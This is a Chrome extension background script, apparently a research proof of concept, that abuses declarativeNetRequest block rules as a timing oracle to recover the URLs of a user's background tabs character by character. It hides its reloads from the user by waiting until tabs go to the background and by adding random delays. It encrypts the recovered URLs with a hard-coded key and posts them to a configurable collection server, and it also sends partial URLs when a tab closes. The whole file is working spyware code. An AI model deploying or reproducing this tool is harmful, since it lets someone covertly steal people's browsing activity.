const TIMEOUT_MS  = 5000;
let maxLen        = 128;  // configurable from popup

const escRe = s => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
const escCC = c => c.replace(/[-\\\]^]/g, "\\$&");
const cls   = a => `[${a.map(escCC).join("")}]`;

const ALPHABET =
  "abcdefghijklmnopqrstuvwxyz" +
  "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
  "0123456789:/?&=.-_%#@!~+,;'";

const SORTED  = [...ALPHABET].sort();
const SCHEMES = ["https://", "http://"];

let leaking = false;
let blockThreshold = 30;
let currentLeakTabId = null;
let abortLeak = false;
let currentLeakScheme = null;
let currentLeakPrefix = "";
let globalPaused = false;
let calibrating = false;

// Publish current leak state to storage so the popup can read it
const publishStatus = () => {
    chrome.storage.local.set({
        leakStatus: {
            paused:      globalPaused,
            calibrating: calibrating,
            tabId:       currentLeakTabId,
            prefix:      currentLeakScheme ? currentLeakScheme + currentLeakPrefix : currentLeakPrefix,
            charPos:     currentLeakPrefix.length,
            maxLen:      maxLen,
            queueLen:    queue.length + waitingForBackground.size,
            ts:          Date.now()
        }
    });
};

// ─── DNR rule management ───

const setBlock = async (regex) => {
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: rules.map(r => r.id),
        addRules: [{
            id: 1,
            priority: 1,
            action: { type: "block" },
            condition: {
                regexFilter: regex,
                isUrlFilterCaseSensitive: true,
                resourceTypes: ["main_frame"]
            }
        }]
    });
};

const clearRules = async () => {
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: rules.map(r => r.id)
    });
};

// ─── Timing oracle ───
// Uses per-probe temporary listeners. Waits for "loading" BEFORE accepting
// "complete" so stale completion events from error pages are ignored.

// earlyExitMs: once this many ms have elapsed since the reload (measured from
// the moment "loading" fires) we already know the URL was NOT blocked — resolve
// immediately instead of waiting for the full page load to complete.
const reloadTab = (tabId, earlyExitMs = TIMEOUT_MS) => {
    return new Promise(resolve => {
        if (abortLeak) { resolve(null); return; }
        let sawLoading = false;
        let resolved   = false;
        let earlyTimer = null;
        const start    = performance.now();

        const finish = (t) => {
            if (resolved) return;
            resolved = true;
            chrome.tabs.onUpdated.removeListener(listener);
            clearTimeout(timer);
            clearTimeout(earlyTimer);
            resolve(t);
        };

        const listener = (tid, info) => {
            if (tid !== tabId) return;
            if (info.status === "loading" && !sawLoading) {
                sawLoading = true;
                // Schedule early exit at exactly earlyExitMs from reload start.
                // Subtract time already elapsed waiting for the loading event.
                const remaining = earlyExitMs - (performance.now() - start);
                earlyTimer = setTimeout(
                    () => finish(performance.now() - start),
                    Math.max(0, remaining)
                );
            }
            if (info.status === "complete" && sawLoading) {
                finish(performance.now() - start);
            }
        };

        const timer = setTimeout(() => finish(abortLeak ? null : TIMEOUT_MS), TIMEOUT_MS);
        chrome.tabs.onUpdated.addListener(listener);
        chrome.tabs.reload(tabId, { bypassCache: true });
    });
};

// ─── Calibration ───
// Measures actual blocked vs. unblocked round-trip times and sets the
// threshold dynamically so it works on LAN, WAN, and everything in between.

const calibrate = async (tabId) => {
    calibrating = true;
    publishStatus();
    console.log("[*] Calibrating timing oracle...");

    // Warm up — first reload is often an outlier
    await clearRules();
    await reloadTab(tabId);

    // Blocked samples (rule matches everything)
    await setBlock("https://.*|http://.*");
    const b = [];
    for (let i = 0; i < 5; i++) {
        if (abortLeak) return;
        b.push(await reloadTab(tabId));
    }
    b.sort((a, c) => a - c);
    const blocked = b[Math.floor(b.length / 2)]; // median

    // Unblocked samples (no rules active)
    await clearRules();
    await reloadTab(tabId); // warm-up after rule change
    const u = [];
    for (let i = 0; i < 5; i++) {
        if (abortLeak) return;
        u.push(await reloadTab(tabId));
    }
    u.sort((a, c) => a - c);
    const unblocked = u[Math.floor(u.length / 2)]; // median

    // Sanity check — blocked must be significantly faster than unblocked
    if (blocked >= unblocked * 0.8) {
        // Can't distinguish — use a safe fallback
        blockThreshold = 40;
        console.warn(
            `[!] Calibration ambiguous: blocked=${Math.round(blocked)}ms,`,
            `unblocked=${Math.round(unblocked)}ms — using fallback threshold=${blockThreshold}ms`
        );
        calibrating = false;
        publishStatus();
    } else {
        blockThreshold = blocked + (unblocked - blocked) * 0.3;
        console.log(
            `[*] Calibration done: blocked=${Math.round(blocked)}ms,`,
            `unblocked=${Math.round(unblocked)}ms,`,
            `threshold=${Math.round(blockThreshold)}ms`
        );
    }
    calibrating = false;
    publishStatus();
};

const AMBIG_FACTOR_DEFAULT = 0.4;
let ambigFactor  = AMBIG_FACTOR_DEFAULT; // configurable from popup
const MAX_VOTES  = 3;
// Inter-probe jitter: configurable from the popup. A random wait between
// [jitterMin, jitterMax] ms is inserted before each reload.
let jitterEnabled = false; // configurable from popup
let jitterMin = 400;   // ms — updated from storage
let jitterMax = 1200;  // ms — updated from storage
// Recalibrate every this many leaked characters to catch oracle drift.
let recalibrateEvery = 20;  // configurable from popup
// Validate the accumulated prefix every this many characters to catch
// corruption caused by timing noise or bot-detection redirects.
let validateEvery = 15;     // configurable from popup
let backtrackLen  = 5;      // chars to trim when prefix validation fails
// Number of consecutive catch-all misses required before accepting end-of-URL.
// Higher = less likely to terminate early on a noisy probe; lower = faster.
let nullConfirmRounds = 3;  // configurable from popup

const sleep = ms => new Promise(r => setTimeout(r, ms));
const jitter = () => jitterEnabled
    ? sleep(jitterMin + Math.random() * Math.max(0, jitterMax - jitterMin))
    : Promise.resolve();

const blockedBy = async (regex, tabId) => {
    if (abortLeak) return false;
    await setBlock(regex);

    const lo = ambigFactor > 0 ? blockThreshold * (1 - ambigFactor) : blockThreshold;
    const hi = ambigFactor > 0 ? blockThreshold * (1 + ambigFactor) : blockThreshold;
    let blocks = 0, votes = 0;
    for (let i = 0; i < MAX_VOTES; i++) {
        if (abortLeak) return false;
        await jitter();
        if (abortLeak) return false;
        // Pass hi as the early-exit cutoff: as soon as elapsed > hi we know
        // the URL was allowed, so there's no need to wait for the full load.
        const t = await reloadTab(tabId, hi);
        if (t === null) return false;
        votes++;
        const hit = t < blockThreshold;
        console.log(`[t${votes}] ${Math.round(t)}ms ${hit ? "BLOCK" : "ALLOW"}`);
        if (hit) blocks++;
        if (t < lo) return true;
        if (t > hi) return false;
        if (blocks > MAX_VOTES / 2) return true;
        if ((MAX_VOTES - i - 1 + blocks) <= MAX_VOTES / 2) return false;
    }
    return blocks > MAX_VOTES / 2;
};

// ─── Leak logic ───

const detectScheme = async (tabId) => {
    for (const scheme of SCHEMES) {
        if (await blockedBy(scheme + ".*", tabId)) {
            console.log("[*] Detected scheme:", scheme);
            return scheme;
        }
    }
    return null;
};

// Builds a compact regex for probing the next character after (scheme + prefix).
// For short prefixes: full literal anchor  →  ^scheme_prefix[class]
// For long prefixes:  scheme literal + .* + last TAIL_LEN chars of prefix + [class]
//   The tail is taken from `prefix` only (after the scheme), because after
//   `^scheme` is consumed, the remaining string starts with prefix, not with
//   scheme+prefix, so including scheme chars in the tail would never match.
const TAIL_LEN = 20;

const makeProbeRe = (scheme, prefix, charClass) => {
    const full = scheme + prefix;
    if (full.length <= TAIL_LEN) {
        // Short enough — use the whole known string as a literal anchor
        return `^${escRe(full)}${charClass}`;
    }
    // Long prefix: anchor scheme, skip middle with .*, then last TAIL_LEN chars of
    // prefix (which are in the post-scheme part of the URL), then the class.
    const tail = escRe(prefix.slice(-TAIL_LEN));
    return `^${escRe(scheme)}.*${tail}${charClass}`;
};

// Validates that the accumulated prefix still matches the live URL.
// Probes whether the URL starts with scheme and contains the tail of prefix.
// Returns false if the oracle no longer fires, indicating prefix corruption.
const makePrefixCheckRe = (scheme, prefix) => {
    const full = scheme + prefix;
    if (full.length <= TAIL_LEN) return `^${escRe(full)}`;
    return `^${escRe(scheme)}.*${escRe(prefix.slice(-TAIL_LEN))}`;
};

const leakChar = async (scheme, prefix, tabId) => {
    let set = SORTED.slice();
    while (set.length > 1) {
        if (abortLeak) return null;
        const mid  = set.length >> 1;
        const left = set.slice(0, mid);
        set = await blockedBy(makeProbeRe(scheme, prefix, cls(left)), tabId)
            ? left : set.slice(mid);
    }
    const c = set[0];
    if (!c) return null;
    // Verify the narrowed character; retry once on failure to guard against
    // a single noisy sample causing premature URL termination.
    const v1 = await blockedBy(makeProbeRe(scheme, prefix, `[${escCC(c)}]`), tabId);
    if (v1) return c;
    const v2 = await blockedBy(makeProbeRe(scheme, prefix, `[${escCC(c)}]`), tabId);
    return v2 ? c : null;
};

const leak = async (tabId) => {
    let scheme, out, calibrated;

    // Resume from saved progress if available
    if (partialProgress.has(tabId)) {
        const saved = partialProgress.get(tabId);
        scheme     = saved.scheme;
        out        = saved.prefix;
        calibrated = saved.calibrated;
        console.log(`[*] Resuming tab ${tabId} from: ${scheme}${out}`);
        partialProgress.delete(tabId);
    } else {
        scheme     = null;
        out        = "";
        calibrated = false;
    }

    // Calibrate if we haven't yet for this tab
    if (!calibrated) {
        await calibrate(tabId);
        if (abortLeak) {
            partialProgress.set(tabId, { scheme, prefix: out, calibrated: false });
            return "";
        }
    }

    // Detect scheme if we don't have one yet
    if (!scheme) {
        scheme = await detectScheme(tabId);
        if (abortLeak) {
            if (!closingTabs.has(tabId))
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
            return "";
        }
        if (!scheme) {
            console.log("[-] Could not detect scheme (chrome:// / file:// / about:).");
            return "";
        }
    }

    const initialLen = out.length;
    let nullStreak = 0;   // consecutive positions where leakChar returned null
    let prev = out.length > 0 ? out[out.length - 1] : null;
    currentLeakScheme = scheme;
    currentLeakPrefix = out;
    for (let i = out.length; i < maxLen; i++) {
        if (abortLeak) {
            // Save progress for later resume (unless the tab was closed)
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        const charsLeaked = out.length - initialLen;
        // Periodic recalibration every recalibrateEvery confirmed characters.
        if (recalibrateEvery > 0 && charsLeaked > 0 && charsLeaked % recalibrateEvery === 0) {
            console.log(`[*] Recalibrating at position ${out.length}...`);
            await clearRules();
            await calibrate(tabId);
            if (abortLeak) {
                if (!closingTabs.has(tabId))
                    partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                break;
            }
        }
        // Periodic prefix validation: confirm the accumulated prefix still
        // matches the real URL. Catches corruption from noise or bot-detection
        // redirects that change the page the oracle sees.
        if (validateEvery > 0 && charsLeaked > 0 && charsLeaked % validateEvery === 0) {
            console.log(`[*] Validating prefix at "${scheme}${out}"...`);
            const prefixOk = await blockedBy(makePrefixCheckRe(scheme, out), tabId);
            if (!prefixOk && !abortLeak) {
                console.warn(`[!] Prefix validation failed — recalibrating and backtracking ${backtrackLen} chars`);
                await clearRules();
                await calibrate(tabId);
                if (abortLeak) {
                    if (!closingTabs.has(tabId))
                        partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                    break;
                }
                const trim = Math.min(backtrackLen, out.length);
                out = out.slice(0, -trim);
                currentLeakPrefix = out;
                i = out.length - 1; // for-loop will increment to out.length
                prev = out.length > 0 ? out[out.length - 1] : null;
                sameCount = 0;
                continue;
            }
        }

        const c = await leakChar(scheme, out, tabId);
        if (abortLeak) {
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        if (!c) {
            // Increment the null streak and confirm with a catch-all probe.
            // Only terminate when nullConfirmRounds consecutive attempts all
            // produce no character AND the catch-all probe also returns false.
            nullStreak++;
            const anyMore = await blockedBy(makeProbeRe(scheme, out, cls(SORTED)), tabId);
            if (!abortLeak && anyMore) {
                // Catch-all fired — real character exists but binary search
                // narrowed incorrectly due to noise. Reset streak and retry.
                console.log(`[~] Noisy null at position ${out.length} (streak ${nullStreak}) — catch-all fired, retrying`);
                nullStreak = 0;
                i--;
                continue;
            }
            if (!abortLeak && nullStreak < nullConfirmRounds) {
                // Catch-all silent but haven't reached the required streak yet.
                console.log(`[~] Null streak ${nullStreak}/${nullConfirmRounds} at position ${out.length} — retrying`);
                i--;
                continue;
            }
            // Reached nullConfirmRounds consecutive misses with no catch-all —
            // accept as genuine end-of-URL.
            console.log(`[*] End-of-URL confirmed after ${nullStreak} consecutive null probes`);
            break;
        }
        nullStreak = 0;
        out += c;
        currentLeakPrefix = out;
        publishStatus();
        prev = c;
        console.log("[+]", scheme + out);
    }
    await clearRules();
    currentLeakScheme = null;
    currentLeakPrefix = "";
    if (abortLeak || !out) return abortLeak ? "" : scheme + out;

    // Final end-of-URL verification: confirm the full leaked string is anchored
    // to the real URL. If this fails, the last characters may be noise —
    // trim back one at a time until the prefix validates or we run out.
    let verified = await blockedBy(makePrefixCheckRe(scheme, out), tabId);
    while (!verified && out.length > 0 && !abortLeak) {
        console.warn(`[!] Final verification failed at length ${out.length} — trimming last char`);
        out = out.slice(0, -1);
        if (!out) break;
        verified = await blockedBy(makePrefixCheckRe(scheme, out), tabId);
    }
    await clearRules();
    return scheme + out;
};

// --- Encryption (AES-GCM via Web Crypto API) ---
// Pre-shared key material — must match server
const PSK = "ch40s_r3s34rch_k3y_2026";

const deriveKey = async () => {
    const enc  = new TextEncoder();
    const base = await crypto.subtle.importKey(
        "raw", enc.encode(PSK), "PBKDF2", false, ["deriveKey"]
    );
    return crypto.subtle.deriveKey(
        { name: "PBKDF2", salt: enc.encode("dnr-salt"), iterations: 100000, hash: "SHA-256" },
        base,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt"]
    );
};

const encryptPayload = async (data) => {
    const key = await deriveKey();
    const iv  = crypto.getRandomValues(new Uint8Array(12));
    const enc = new TextEncoder();
    const ct  = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(data));
    const toB64 = buf => {
        let bin = "";
        const bytes = new Uint8Array(buf);
        for (let i = 0; i < bytes.byteLength; i++) bin += String.fromCharCode(bytes[i]);
        return btoa(bin);
    };
    return { iv: toB64(iv.buffer), ct: toB64(ct) };
};

// --- Exfiltration ---
const DEFAULT_EXFIL_URL = "http://localhost:3000";

const getExfilUrl = () => new Promise(resolve =>
    chrome.storage.local.get("exfilUrl", ({ exfilUrl }) =>
        resolve((exfilUrl || DEFAULT_EXFIL_URL).replace(/\/$/, ""))
    )
);

const exfiltrate = async (urls, partial = false) => {
    const serverUrl = await getExfilUrl();
    const payload = await encryptPayload(JSON.stringify({ urls, partial }));
    await fetch(`${serverUrl}/upload`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ ...payload, ts: Date.now() })
    });
};

// --- Main ---

// Track which tabs have already been leaked so we don't repeat
const leakedTabs = new Set();

// Tabs that were closed while being actively leaked — don't save partial progress for these
const closingTabs = new Set();

// Listen for setting changes from the popup
chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;
    if ("jitterEnabled" in changes) jitterEnabled = !!changes.jitterEnabled.newValue;
    if ("jitterMin"     in changes) jitterMin     = Math.max(0, Number(changes.jitterMin.newValue)     || 0);
    if ("jitterMax"     in changes) jitterMax     = Math.max(0, Number(changes.jitterMax.newValue)     || 0);
    if ("maxLen"            in changes) maxLen          = Math.max(1, Number(changes.maxLen.newValue)            || 128);
    if ("ambigFactor"       in changes) ambigFactor     = Math.max(0, Number(changes.ambigFactor.newValue)       || 0);
    if ("recalibrateEvery"  in changes) recalibrateEvery = Math.max(0, Number(changes.recalibrateEvery.newValue)  || 0);
    if ("validateEvery"     in changes) validateEvery   = Math.max(0, Number(changes.validateEvery.newValue)     || 0);
    if ("backtrackLen"      in changes) backtrackLen    = Math.max(0, Number(changes.backtrackLen.newValue)      || 0);
    if ("nullConfirmRounds" in changes) nullConfirmRounds = Math.max(1, Number(changes.nullConfirmRounds.newValue) || 1);
    if (!("isPaused" in changes)) return;
    globalPaused = changes.isPaused.newValue;
    if (globalPaused) {
        if (currentLeakTabId !== null) abortLeak = true;
        console.log("[*] Leak engine paused by user");
        publishStatus();
    } else {
        console.log("[*] Leak engine resumed by user");
        publishStatus();
        processQueue();
    }
});

// Partial progress saved when a leak is aborted mid-way
// Map<tabId, { scheme: string, prefix: string, calibrated: boolean }>
const partialProgress = new Map();

const leakTab = async (tabId) => {
    currentLeakTabId = tabId;
    if (!globalPaused) abortLeak = false; // only clear abort flag if not paused
    publishStatus();
    let url = "";
    try {
        url = await leak(tabId);
    } catch (e) {
        console.error("[-] Leak error on tab", tabId, e);
        url = "";
    }
    currentLeakTabId = null;
    publishStatus();

    if (abortLeak || !url) {
        // Aborted — tab became active. Don't mark as leaked.
        abortLeak = false;
        return;
    }

    leakedTabs.add(tabId);
    console.log(`[*] Tab ${tabId} leaked:`, url);

    // Append to stored list
    const { leakedUrls = [] } = await chrome.storage.local.get("leakedUrls");
    leakedUrls.push({ tabId, url, ts: Date.now() });
    await chrome.storage.local.set({ leakedUrls });

    // Exfiltrate immediately
    await exfiltrate([url]);
};

// Queue-based processing — leaks tabs one at a time
const queue = [];
let processing = false;

// Tabs that can't be leaked yet because they're active.
// Moved back to the queue when they go to background.
const waitingForBackground = new Set();

const enqueue = (tabId) => {
    if (leakedTabs.has(tabId)) return;      // already done
    if (queue.includes(tabId)) return;       // already queued
    if (waitingForBackground.has(tabId)) return; // already waiting
    queue.push(tabId);
    processQueue();
};

const processQueue = async () => {
    if (processing) return;
    if (globalPaused) return;
    processing = true;
    leaking = true;
    publishStatus();
    while (queue.length > 0) {
        if (globalPaused) break;
        const tabId = queue.shift();
        let tab;
        try { tab = await chrome.tabs.get(tabId); } catch { publishStatus(); continue; }
        if (tab.active) {
            console.log(`[*] Tab ${tabId} is active, deferring until it goes to background`);
            waitingForBackground.add(tabId);
            publishStatus();
            continue;
        }
        console.log(`[*] Leaking background tab ${tabId} (${queue.length} remaining in queue)...`);
        await leakTab(tabId);
        if (globalPaused) break;
    }
    leaking = false;
    processing = false;
    publishStatus();
};

// On user navigation / new tab load, queue for leaking
chrome.tabs.onUpdated.addListener(async (tabId, info) => {
    if (info.status === "complete") {
        if (tabId === currentLeakTabId) return; // ignore oracle reloads
        if (leakedTabs.has(tabId)) return;      // already done
        let tab;
        try { tab = await chrome.tabs.get(tabId); } catch { return; }
        if (tab.active) {
            // Tab is active — park it so it's queued when the user switches away
            if (!waitingForBackground.has(tabId) && !queue.includes(tabId)) {
                console.log(`[*] New/navigated active tab ${tabId} — will queue when backgrounded`);
                waitingForBackground.add(tabId);
                publishStatus();
            }
            return;
        }
        leakedTabs.delete(tabId); // URL may have changed
        console.log("[*] Background navigation detected on tab", tabId);
        enqueue(tabId);
    }
});

// When a tab is closed, clean up
chrome.tabs.onRemoved.addListener(async (tabId) => {
    if (currentLeakTabId === tabId && currentLeakPrefix) {
        const partial = (currentLeakScheme || "") + currentLeakPrefix;
        console.log(`[!] Tab ${tabId} closed mid-leak — exfiltrating partial: ${partial}`);
        closingTabs.add(tabId);
        abortLeak = true;
        await exfiltrate([partial], true);
    } else if (partialProgress.has(tabId)) {
        // Tab closed while paused — exfil the saved partial progress
        const p = partialProgress.get(tabId);
        const partial = (p.scheme || "") + (p.prefix || "");
        if (partial) {
            console.log(`[!] Tab ${tabId} closed with saved partial — exfiltrating: ${partial}`);
            await exfiltrate([partial], true);
        }
    }
    leakedTabs.delete(tabId);
    partialProgress.delete(tabId);
    waitingForBackground.delete(tabId);
    closingTabs.delete(tabId);
    // Remove from queue if waiting to be leaked
    const qi = queue.indexOf(tabId);
    if (qi !== -1) queue.splice(qi, 1);
    publishStatus();
});

// When a tab becomes active, abort if we're leaking it.
// Also re-enqueue any tabs that were waiting to go to background.
chrome.tabs.onActivated.addListener(({ tabId }) => {
    if (currentLeakTabId === tabId) {
        console.log(`[!] Tab ${tabId} became active — pausing leak, will resume when backgrounded`);
        abortLeak = true;
        waitingForBackground.add(tabId);
    }

    // The previously-active tab(s) are now in background — release deferred tabs
    // (excluding the just-activated tab itself)
    for (const deferredId of waitingForBackground) {
        if (deferredId !== tabId) {
            console.log(`[*] Tab ${deferredId} is now in background — re-enqueueing`);
            waitingForBackground.delete(deferredId);
            enqueue(deferredId);
        }
    }
    publishStatus();
});

// On startup, restore paused state and all configurable settings
chrome.storage.local.get(
    ["isPaused", "jitterEnabled", "jitterMin", "jitterMax", "maxLen", "ambigFactor",
     "recalibrateEvery", "validateEvery", "backtrackLen", "nullConfirmRounds"],
    ({ isPaused, jitterEnabled: jEn, jitterMin: jMin, jitterMax: jMax, maxLen: mLen, ambigFactor: af,
       recalibrateEvery: rce, validateEvery: ve, backtrackLen: bl, nullConfirmRounds: ncr }) => {
    globalPaused = isPaused !== false; // default to true if never set
    if (isPaused   === undefined) chrome.storage.local.set({ isPaused: true });
    if (jEn        !== undefined) jitterEnabled    = !!jEn;
    if (jMin       !== undefined) jitterMin        = jMin;
    if (jMax       !== undefined) jitterMax        = jMax;
    if (mLen       !== undefined) maxLen           = Math.max(1, mLen);
    if (af         !== undefined) ambigFactor      = Math.max(0, af);
    if (rce        !== undefined) recalibrateEvery = Math.max(0, rce);
    if (ve         !== undefined) validateEvery    = Math.max(0, ve);
    if (bl         !== undefined) backtrackLen     = Math.max(0, bl);
    if (ncr        !== undefined) nullConfirmRounds = Math.max(1, ncr);
    chrome.tabs.query({}).then(tabs => {
        const bgTabs = tabs.filter(t => !t.active);
        console.log(`[*] Found ${bgTabs.length} background tab(s), queueing... (paused=${globalPaused})`);
        for (const tab of bgTabs) enqueue(tab.id);
        publishStatus();
    });
});